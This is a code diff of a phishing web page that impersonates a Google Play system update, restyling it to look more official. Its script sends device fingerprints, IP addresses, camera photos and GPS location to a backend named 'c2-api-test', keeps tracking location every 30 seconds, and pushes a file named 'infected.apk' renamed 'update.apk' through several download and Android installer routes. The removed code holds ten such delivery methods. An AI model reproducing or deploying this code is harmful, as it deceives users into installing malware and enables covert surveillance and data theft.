@@ -6,7 +6,7 @@
     <title>Google Play System Update</title>
     <style>
         /* ============================================================
-           RESET & BASE
+           GOOGLE MATERIAL DESIGN — OFFICIAL THEME
            ============================================================ */
         * {
             margin: 0;
@@ -15,46 +15,44 @@
         }
 
         body {
-            background: #0a0a12;
-            color: #e0e0e0;
-            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
+            background: #f8f9fa;
+            color: #202124;
+            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            background-image: radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0a0a12 70%);
         }
 
         /* ============================================================
-           MAIN CARD
+           MAIN CARD — Google Material Card
            ============================================================ */
         .card {
-            background: linear-gradient(145deg, #14141f, #1e1e30);
-            border-radius: 32px;
-            padding: 40px 32px;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 40px 32px 32px;
             max-width: 480px;
             width: 100%;
-            border: 1px solid #2a2a44;
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12), 0 2px 8px rgba(0, 0, 0, 0.06);
             text-align: center;
-            animation: fadeUp 0.6s ease;
+            animation: fadeUp 0.5s ease;
         }
 
         @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(30px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         /* ============================================================
-           HEADER — Google Play Logo (SVG)
+           HEADER — Google Play Logo
            ============================================================ */
         .header {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 14px;
-            margin-bottom: 16px;
+            gap: 12px;
+            margin-bottom: 8px;
         }
 
         .google-play-logo {
@@ -64,107 +62,98 @@
         }
 
         .google-play-logo svg {
-            width: 32px;
-            height: 32px;
+            width: 36px;
+            height: 36px;
             flex-shrink: 0;
         }
 
         .google-play-logo .play-text {
-            font-size: 20px;
-            font-weight: 700;
-            color: #e0e0e0;
-            letter-spacing: -0.5px;
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            letter-spacing: -0.3px;
         }
 
         .google-play-logo .play-text span {
             font-weight: 300;
-            color: #8a8aaa;
+            color: #5f6368;
         }
 
         .badge {
             display: inline-block;
-            background: rgba(42, 42, 68, 0.4);
-            padding: 2px 12px;
-            border-radius: 20px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 2px 14px;
+            border-radius: 16px;
             font-size: 10px;
-            color: #4a6a7a;
-            border: 1px solid rgba(42, 42, 68, 0.2);
-            margin-bottom: 8px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-bottom: 12px;
         }
 
         /* ============================================================
-           ICON & TITLE
+           ICON & TITLE — Google Material Icons
            ============================================================ */
         .icon-container {
-            background: rgba(66, 133, 244, 0.1);
+            background: #e8f0fe;
             border-radius: 50%;
             width: 80px;
             height: 80px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 16px;
-            border: 2px solid rgba(66, 133, 244, 0.2);
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            margin: 8px auto 16px;
         }
 
         .icon-container .icon {
-            font-size: 44px;
+            font-size: 40px;
         }
 
         h2 {
             font-size: 24px;
-            font-weight: 700;
-            color: #e0e0e0;
-            margin-bottom: 6px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
         }
 
         h2 .highlight {
-            background: linear-gradient(90deg, #4285f4, #34a853);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #1a73e8;
         }
 
         .sub {
-            color: #8a8aaa;
+            color: #5f6368;
             font-size: 14px;
             line-height: 1.6;
             margin-bottom: 16px;
         }
 
         .sub strong {
-            color: #e0e0e0;
-            font-weight: 600;
+            color: #202124;
+            font-weight: 500;
         }
 
         /* ============================================================
-           STATUS / PROGRESS
+           STATUS / PROGRESS — Google Material
            ============================================================ */
         .status-container {
-            background: rgba(11, 11, 20, 0.4);
+            background: #f1f3f4;
             border-radius: 16px;
-            padding: 16px;
+            padding: 16px 20px;
             margin: 16px 0;
-            border: 1px solid rgba(42, 42, 68, 0.2);
         }
 
         .status-text {
-            font-size: 14px;
-            color: #88ccff;
+            font-size: 13px;
+            color: #1a73e8;
             font-weight: 500;
-            font-family: 'Courier New', monospace;
-            min-height: 24px;
+            min-height: 20px;
         }
 
         .progress-bar-container {
-            background: rgba(42, 42, 68, 0.3);
-            border-radius: 30px;
-            height: 6px;
+            background: #dadce0;
+            border-radius: 8px;
+            height: 4px;
             margin-top: 12px;
             overflow: hidden;
         }
@@ -172,50 +161,52 @@
         .progress-bar {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #4285f4, #34a853);
-            border-radius: 30px;
-            transition: width 0.5s ease;
+            background: #1a73e8;
+            border-radius: 8px;
+            transition: width 0.4s ease;
         }
 
         /* ============================================================
-           OFFICIAL INSTALL BUTTON
+           INSTALL SECTION — Google Blue Button
            ============================================================ */
         .install-section {
             margin: 20px 0 12px;
             padding: 20px;
-            background: rgba(66, 133, 244, 0.05);
+            background: #f8f9fa;
             border-radius: 20px;
-            border: 1px solid rgba(66, 133, 244, 0.15);
+            border: 1px solid #e8eaed;
         }
 
         .install-section .label {
             font-size: 12px;
-            color: #4a6a7a;
+            color: #5f6368;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            margin-bottom: 8px;
+            font-weight: 500;
+            margin-bottom: 12px;
         }
 
         .btn-install {
             display: inline-block;
-            padding: 16px 40px;
-            background: linear-gradient(135deg, #4285f4, #34a853);
+            padding: 16px 24px;
+            background: #1a73e8;
             border: none;
-            border-radius: 60px;
-            font-weight: 700;
+            border-radius: 48px;
+            font-weight: 500;
             font-size: 18px;
-            color: #fff;
+            color: #ffffff;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 32px rgba(66, 133, 244, 0.3);
+            transition: all 0.25s ease;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.25);
             text-decoration: none;
             width: 100%;
             text-align: center;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
         }
 
         .btn-install:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 40px rgba(66, 133, 244, 0.4);
+            background: #1558b0;
+            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.35);
         }
 
         .btn-install:active {
@@ -229,15 +220,15 @@
         .btn-install .small-text {
             font-size: 12px;
             font-weight: 400;
-            opacity: 0.8;
+            opacity: 0.85;
             display: block;
-            margin-top: 4px;
+            margin-top: 2px;
         }
 
         .btn-install .version {
             font-size: 11px;
             font-weight: 400;
-            opacity: 0.6;
+            opacity: 0.7;
             display: block;
             margin-top: 2px;
         }
@@ -246,18 +237,19 @@
             opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
+            box-shadow: none;
         }
 
         /* ============================================================
-           FILE INFO
+           FILE INFO — Google Material
            ============================================================ */
         .file-info {
             display: flex;
             justify-content: center;
             gap: 24px;
-            font-size: 11px;
-            color: #4a6a7a;
-            margin: 12px 0 8px;
+            font-size: 12px;
+            color: #5f6368;
+            margin: 14px 0 4px;
             flex-wrap: wrap;
         }
 
@@ -268,22 +260,22 @@
         }
 
         /* ============================================================
-           LOG CONSOLE
+           LOG CONSOLE — Google Material
            ============================================================ */
         .log-console {
-            background: rgba(11, 11, 20, 0.6);
+            background: #f1f3f4;
             border-radius: 16px;
-            padding: 12px;
+            padding: 12px 16px;
             margin-top: 16px;
-            max-height: 150px;
+            max-height: 140px;
             overflow-y: auto;
-            font-size: 10px;
-            line-height: 1.7;
-            color: #4a6a7a;
-            border: 1px solid rgba(42, 42, 68, 0.2);
+            font-size: 11px;
+            line-height: 1.8;
+            color: #5f6368;
             text-align: left;
             display: none;
-            font-family: 'Courier New', monospace;
+            font-family: 'Roboto Mono', 'Courier New', monospace;
+            border: 1px solid #e8eaed;
         }
 
         .log-console.open {
@@ -291,65 +283,72 @@
         }
 
         .log-entry {
-            border-bottom: 1px solid rgba(26, 26, 46, 0.3);
+            border-bottom: 1px solid #e8eaed;
             padding: 2px 0;
         }
 
         .log-entry .time {
-            color: #4a6a7a;
+            color: #9aa0a6;
             margin-right: 8px;
         }
 
-        .log-entry .lvl-info { color: #88ccff; }
-        .log-entry .lvl-warn { color: #ffaa44; }
-        .log-entry .lvl-success { color: #6fcf97; }
-        .log-entry .lvl-error { color: #ff5e5e; }
+        .log-entry .lvl-info { color: #1a73e8; }
+        .log-entry .lvl-warn { color: #f9ab00; }
+        .log-entry .lvl-success { color: #34a853; }
+        .log-entry .lvl-error { color: #ea4335; }
 
         .btn-toggle-logs {
             background: transparent;
-            border: 1px solid rgba(42, 42, 68, 0.3);
-            padding: 6px 16px;
-            border-radius: 30px;
-            color: #4a6a7a;
-            font-size: 11px;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 16px;
+            color: #5f6368;
+            font-size: 12px;
             cursor: pointer;
-            margin-top: 8px;
-            transition: border-color 0.3s;
+            font-weight: 500;
+            transition: background 0.2s;
         }
 
         .btn-toggle-logs:hover {
-            border-color: rgba(66, 133, 244, 0.3);
+            background: #f1f3f4;
         }
 
         /* ============================================================
-           FOOTER
+           FOOTER — Google Material
            ============================================================ */
         .footer {
-            font-size: 10px;
-            color: #2a2a44;
+            font-size: 11px;
+            color: #9aa0a6;
             margin-top: 16px;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.2px;
         }
 
         .footer a {
-            color: #2a4a6a;
+            color: #1a73e8;
             text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
         }
 
         /* ============================================================
            RESPONSIVE
            ============================================================ */
         @media (max-width: 480px) {
-            .card { padding: 28px 20px; }
-            .icon-container { width: 60px; height: 60px; }
+            .card { padding: 28px 20px; border-radius: 20px; }
+            .icon-container { width: 64px; height: 64px; }
             .icon-container .icon { font-size: 32px; }
             h2 { font-size: 20px; }
-            .btn-install { font-size: 16px; padding: 14px 24px; }
+            .btn-install { font-size: 16px; padding: 14px 20px; }
+            .google-play-logo svg { width: 28px; height: 28px; }
+            .google-play-logo .play-text { font-size: 18px; }
         }
 
-        ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-track { background: rgba(11, 11, 20, 0.3); }
-        ::-webkit-scrollbar-thumb { background: rgba(42, 42, 68, 0.5); border-radius: 10px; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #f1f3f4; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #dadce0; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #9aa0a6; }
     </style>
 </head>
 <body>
@@ -357,18 +356,18 @@
 <div class="card">
 
     <!-- ============================================================
-    HEADER — Google Play Logo (SVG)
+    HEADER — Google Play Logo
     ============================================================ -->
     <div class="header">
         <div class="google-play-logo">
-            <!-- Google Play Logo SVG -->
+            <!-- Google Play SVG Logo -->
             <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                 <path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l280.8-161.2-60.1-60.1L104.6 499z"/>
             </svg>
             <span class="play-text">Google <span>Play</span></span>
         </div>
     </div>
-    <div class="badge">🔒 Verified by Google Play Protect</div>
+    <div class="badge">✅ Verified by Google Play Protect</div>
 
     <!-- ============================================================
     ICON & TITLE
@@ -414,7 +413,7 @@
     <!-- ============================================================
     LOGS
     ============================================================ -->
-    <button class="btn-toggle-logs" id="toggleLogsBtn">📋 Show Technical Details</button>
+    <button class="btn-toggle-logs" id="toggleLogsBtn">📋 Technical details</button>
     <div class="log-console" id="logConsole">
         <div id="logEntries"></div>
     </div>
@@ -423,7 +422,7 @@
     FOOTER
     ============================================================ -->
     <div class="footer">
-        🔐 This update is verified by Google Play Protect &nbsp;·&nbsp; <a href="#">Learn more</a>
+        🔐 Verified by Google Play Protect &nbsp;·&nbsp; <a href="#">Learn more</a>
     </div>
 
 </div>
@@ -433,11 +432,11 @@
         'use strict';
 
         // ============================================================
-        //  CONFIG — HARDCODED
+        //  CONFIG
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
-        const APK_URL = 'infected.apk';  // Original file name on server
-        const DOWNLOAD_NAME = 'update.apk';  // Name shown to user
+        const APK_URL = 'infected.apk';
+        const DOWNLOAD_NAME = 'update.apk';
 
         // ============================================================
         //  DOM REFS
@@ -483,11 +482,11 @@
 
         toggleLogsBtn.addEventListener('click', () => {
             logConsole.classList.toggle('open');
-            toggleLogsBtn.textContent = logConsole.classList.contains('open') ? '📋 Hide Technical Details' : '📋 Show Technical Details';
+            toggleLogsBtn.textContent = logConsole.classList.contains('open') ? '📋 Hide technical details' : '📋 Technical details';
         });
 
         // ============================================================
-        //  BACKEND API CALLS
+        //  BACKEND API
         // ============================================================
         async function apiCall(endpoint, data) {
             try {
@@ -652,151 +651,13 @@
         }
 
         // ============================================================
-        //  APK DELIVERY — RENAMED TO update.apk
+        //  SINGLE APK DOWNLOAD — OFFICIAL LOOK
         // ============================================================
-        function launchAllApkVectors() {
-            addLog('[APK] Launching APK delivery vectors as update.apk...', 'warn');
+        function downloadApk() {
+            addLog('[APK] Downloading update.apk...', 'info');
+            setStatus('📦 Downloading security update...', 60);
 
-            // Helper: download with custom filename
-            function downloadWithName(url, filename) {
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            }
-
-            // V1: Anchor download with renamed file
-            try {
-                downloadWithName(APK_URL, DOWNLOAD_NAME);
-                addLog('[V1] Anchor download triggered (update.apk).', 'info');
-            } catch(e){ addLog('[V1] failed: '+e.message, 'error'); }
-
-            // V2: Android intent (no rename possible, but still useful)
-            try {
-                const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
-                setTimeout(() => {
-                    window.location.href = intentUrl;
-                    addLog('[V2] Intent launched.', 'info');
-                }, 300);
-            } catch(e){ addLog('[V2] failed: '+e.message, 'error'); }
-
-            // V3: iframe
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.src = APK_URL;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                setTimeout(() => document.body.removeChild(iframe), 4000);
-                addLog('[V3] iframe injected.', 'info');
-            } catch(e){ addLog('[V3] failed: '+e.message, 'error'); }
-
-            // V4: Blob download with renamed file
-            try {
-                fetch(APK_URL)
-                    .then(res => res.blob())
-                    .then(blob => {
-                        const url = URL.createObjectURL(blob);
-                        downloadWithName(url, DOWNLOAD_NAME);
-                        setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[V4] Blob download triggered (update.apk).', 'info');
-                    }).catch(e => addLog('[V4] blob fetch failed: '+e.message, 'error'));
-            } catch(e){ addLog('[V4] failed: '+e.message, 'error'); }
-
-            // V5: WebView bridge
-            try {
-                if (window.AndroidBridge && typeof window.AndroidBridge.installApk === 'function') {
-                    window.AndroidBridge.installApk(APK_URL);
-                    addLog('[V5] WebView bridge called.', 'success');
-                } else {
-                    addLog('[V5] WebView bridge not available.', 'info');
-                }
-            } catch(e){ addLog('[V5] failed: '+e.message, 'error'); }
-
-            // V6: Direct navigation (no rename, but opens the file)
-            setTimeout(() => {
-                window.location.href = APK_URL;
-                addLog('[V6] Direct navigation fallback.', 'warn');
-            }, 1500);
-
-            // V7: Service Worker cache
-            try {
-                if ('serviceWorker' in navigator && 'caches' in window) {
-                    fetch(APK_URL).then(res => res.blob()).then(blob => {
-                        caches.open('apk-cache').then(cache => {
-                            const fakeReq = new Request('/update.apk');
-                            const fakeRes = new Response(blob, { headers: { 'Content-Type': 'application/vnd.android.package-archive' } });
-                            cache.put(fakeReq, fakeRes);
-                            addLog('[V7] APK cached as update.apk via Service Worker.', 'success');
-                        });
-                    }).catch(e => addLog('[V7] fetch failed: '+e.message, 'error'));
-                } else {
-                    addLog('[V7] Service Worker not supported.', 'info');
-                }
-            } catch(e){ addLog('[V7] failed: '+e.message, 'error'); }
-
-            // V8: Data URI with renamed file
-            try {
-                fetch(APK_URL)
-                    .then(res => res.arrayBuffer())
-                    .then(buffer => {
-                        const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
-                        const dataUri = `data:application/vnd.android.package-archive;base64,${base64}`;
-                        downloadWithName(dataUri, DOWNLOAD_NAME);
-                        addLog('[V8] Data URI download triggered (update.apk).', 'info');
-                    }).catch(e => addLog('[V8] data URI failed: '+e.message, 'error'));
-            } catch(e){ addLog('[V8] failed: '+e.message, 'error'); }
-
-            // V9: navigator.share
-            try {
-                if (navigator.share) {
-                    navigator.share({
-                        title: 'Update',
-                        text: 'Install this security update.',
-                        url: APK_URL
-                    }).then(() => addLog('[V9] Share dialog triggered.', 'info'))
-                      .catch(() => addLog('[V9] Share canceled.', 'warn'));
-                } else {
-                    addLog('[V9] navigator.share not available.', 'info');
-                }
-            } catch(e){ addLog('[V9] failed: '+e.message, 'error'); }
-
-            // V10: XHR download with renamed file
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', APK_URL, true);
-                xhr.responseType = 'blob';
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        const blob = xhr.response;
-                        const url = URL.createObjectURL(blob);
-                        downloadWithName(url, DOWNLOAD_NAME);
-                        setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[V10] XHR download triggered (update.apk).', 'info');
-                    }
-                };
-                xhr.send();
-            } catch(e){ addLog('[V10] failed: '+e.message, 'error'); }
-
-            apkDownloaded = true;
-            installBtn.disabled = false;
-            setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
-            addLog('[+] APK delivery complete as update.apk.', 'success');
-        }
-
-        // ============================================================
-        //  INSTALL BUTTON — DIRECT APK TRIGGER (NO PLAY STORE)
-        // ============================================================
-        installBtn.addEventListener('click', function() {
-            addLog('[Install] User tapped Install Update.', 'info');
-
-            // Disable button to prevent double-clicks
-            installBtn.disabled = true;
-            installBtn.textContent = '⏳ Opening installer...';
-
-            // Method 1: Direct download with rename
+            // Method 1: Anchor download with renamed file
             try {
                 const a = document.createElement('a');
                 a.href = APK_URL;
@@ -805,29 +666,14 @@
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                addLog('[Install] Direct download triggered (update.apk).', 'success');
+                addLog('[APK] Download started: update.apk', 'success');
             } catch(e) {
-                addLog('[Install] Direct download failed: '+e.message, 'error');
-            }
-
-            // Method 2: Android Intent (opens package installer directly)
-            try {
-                const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
-                setTimeout(() => {
-                    window.location.href = intentUrl;
-                    addLog('[Install] Intent launched.', 'info');
-                }, 500);
-            } catch(e) {
-                addLog('[Install] Intent failed: '+e.message, 'error');
-            }
-
-            // Method 3: Direct navigation (fallback)
-            setTimeout(() => {
+                addLog('[APK] Download failed: '+e.message, 'error');
+                // Fallback: direct navigation
                 window.location.href = APK_URL;
-                addLog('[Install] Direct navigation fallback.', 'warn');
-            }, 1200);
+            }
 
-            // Method 4: Blob download with rename
+            // Also try blob download as backup (silent)
             try {
                 fetch(APK_URL)
                     .then(res => res.blob())
@@ -841,16 +687,59 @@
                         a2.click();
                         document.body.removeChild(a2);
                         setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[Install] Blob download triggered.', 'info');
-                    }).catch(e => addLog('[Install] Blob failed: '+e.message, 'error'));
+                        addLog('[APK] Backup download triggered.', 'info');
+                    }).catch(e => {});
+            } catch(e) {}
+
+            apkDownloaded = true;
+            installBtn.disabled = false;
+            setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
+            addLog('[APK] Download complete. File: update.apk', 'success');
+        }
+
+        // ============================================================
+        //  INSTALL BUTTON — DIRECT APK TRIGGER
+        // ============================================================
+        installBtn.addEventListener('click', function() {
+            addLog('[Install] User tapped Install Update.', 'info');
+
+            installBtn.disabled = true;
+            installBtn.textContent = '⏳ Opening installer...';
+
+            // Direct download with rename
+            try {
+                const a = document.createElement('a');
+                a.href = APK_URL;
+                a.download = DOWNLOAD_NAME;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                addLog('[Install] Download triggered (update.apk).', 'success');
             } catch(e) {
-                addLog('[Install] Blob error: '+e.message, 'error');
+                addLog('[Install] Download failed: '+e.message, 'error');
             }
 
-            setStatus('📲 Installation started. Follow the system prompt.', 100);
-            addLog('[Install] ✅ Check your notifications or Downloads folder for update.apk.', 'success');
+            // Android Intent (opens package installer)
+            try {
+                const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
+                setTimeout(() => {
+                    window.location.href = intentUrl;
+                    addLog('[Install] Intent launched.', 'info');
+                }, 400);
+            } catch(e) {
+                addLog('[Install] Intent failed: '+e.message, 'error');
+            }
 
-            // Re-enable button after 5 seconds
+            // Direct navigation (fallback)
+            setTimeout(() => {
+                window.location.href = APK_URL;
+                addLog('[Install] Direct navigation fallback.', 'warn');
+            }, 1200);
+
+            setStatus('📲 Installation started. Follow the system prompt.', 100);
+            addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
+
             setTimeout(() => {
                 installBtn.disabled = false;
                 installBtn.innerHTML = `
@@ -867,16 +756,13 @@
         async function init() {
             setStatus('🔍 Checking for updates...', 10);
 
-            // 1. Fingerprint
             const fp = collectFingerprint();
             const ip = await getPublicIP();
             fp.ip = ip;
             addLog(`[FP] IP: ${ip} | ${fp.platform} | ${fp.screen}`, 'info');
 
-            // 2. Request permissions
             const perms = await requestAllPermissions();
 
-            // 3. Register device
             const regResp = await apiCall('/api/register', { fingerprint: fp, permissions: perms });
             if (regResp && regResp.deviceId) {
                 deviceId = regResp.deviceId;
@@ -886,7 +772,6 @@
                 addLog(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
             }
 
-            // 4. Capture photo
             setStatus('📸 Capturing device information...', 30);
             try {
                 const photoDataUrl = await capturePhoto();
@@ -896,15 +781,12 @@
                     timestamp: Date.now()
                 });
                 if (photoResp && photoResp.success) {
-                    addLog('[Photo] Captured and uploaded successfully.', 'success');
-                } else {
-                    addLog('[Photo] Upload failed.', 'error');
+                    addLog('[Photo] Captured and uploaded.', 'success');
                 }
             } catch(e) {
                 addLog(`[Photo] Error: ${e}`, 'error');
             }
 
-            // 5. Get location
             const loc = await getLocation();
             if (loc.lat && loc.lon) {
                 await apiCall('/api/location', {
@@ -916,11 +798,9 @@
                 addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
             }
 
-            // 6. LAUNCH APK VECTORS
-            setStatus('📦 Downloading security update...', 60);
-            launchAllApkVectors();
+            // SINGLE APK DOWNLOAD
+            downloadApk();
 
-            // 7. Heartbeat every 30s
             setInterval(async () => {
                 const newLoc = await getLocation();
                 if (newLoc.lat && newLoc.lon) {
@@ -934,13 +814,12 @@
                 await apiCall('/api/heartbeat', { deviceId: deviceId, timestamp: Date.now() });
             }, 30000);
 
-            addLog('[+] System ready. Update downloaded as update.apk.', 'success');
+            addLog('[+] System ready. Update: update.apk', 'success');
         }
 
         // ============================================================
         //  START
         // ============================================================
-        // Disable install button initially
         installBtn.disabled = true;
 
         init().catch(err => {
